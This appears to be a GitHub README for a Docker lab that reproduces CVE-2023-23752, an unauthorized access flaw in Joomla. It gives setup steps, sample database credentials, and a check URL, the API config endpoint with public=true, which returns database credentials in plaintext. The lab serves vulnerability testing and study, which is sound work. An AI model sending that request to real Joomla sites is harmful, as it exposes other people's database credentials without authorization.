# CVE-2023-23752
Joomla Unauthorized Access Vulnerability (CVE-2023-23752) Dockerized

## Installation
-------------


### Recommended (automatic)

1. Clone this repo `git clone https://github.com/karthikuj/CVE-2023-23752-Docker.git`
2. Change directory `cd CVE-2023-23752-Docker`
3. Run `./setup.sh`
4. Open your browser and go to http://localhost:8080/

### Manual

1. Clone this repo `git clone https://github.com/karthikuj/CVE-2023-23752-Docker.git`
2. Change directory `cd CVE-2023-23752-Docker`
3. Run `docker-compose up -d`
4. Open your browser and go to http://localhost:8080/
5. Enter all the details.
6. While configuring the database:
    - Enter `joomladb:mysql` as hostname.
    - Enter `root` as username.
    - Enter `example` as password.
    - Enter `joomla_db` as database name.
    
## Check for CVE-2023-23752
-------------
1. After installation open your browser and navigate to http://localhost:8080/api/index.php/v1/config/application?public=true
2. You will be able to see the databse username and password in plaintext in the response.


## Uninstall
-------------

1. Run `./remove-joomla.sh`
